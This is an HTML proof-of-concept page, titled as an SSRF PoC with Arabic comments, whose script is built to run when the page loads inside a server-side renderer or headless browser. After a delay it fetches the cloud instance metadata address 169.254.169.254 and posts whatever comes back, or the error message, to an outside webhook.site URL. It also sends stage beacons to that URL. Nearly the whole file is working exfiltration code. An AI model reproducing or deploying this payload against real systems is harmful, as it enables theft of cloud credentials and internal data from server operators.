<!DOCTYPE html>
<html>
<head>
    <title>SSRF PoC - Simple HTTP</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // رابط Webhook الجديد الخاص بك
        const WEBHOOK_URL = "https://webhook.site/a5852858-9701-4e74-896b-ba98539cebed";

        // إرسال طلب POST بسيط
        fetch(WEBHOOK_URL + "/Stage1-PoC-Loaded", { method: 'POST', mode: 'no-cors', body: 'hello' });

        setTimeout(() => {
            fetch(WEBHOOK_URL + "/Stage2-Attempting-Internal-Fetch", { method: 'POST', mode: 'no-cors', body: 'hello' });
            fetch('http://169.254.169.254/')
                .then(response => response.text())
                .then(data => {
                    // إذا نجح، أرسل البيانات
                    fetch(WEBHOOK_URL + "/Stage3-SUCCESS", { method: 'POST', mode: 'no-cors', body: data });
                })
                .catch(error => {
                    // إذا فشل، أرسل رسالة الخطأ
                    fetch(WEBHOOK_URL + "/Stage4-FAILED", { method: 'POST', mode: 'no-cors', body: error.toString() });
                });
        }, 7000);
    </script>
</body>
</html>
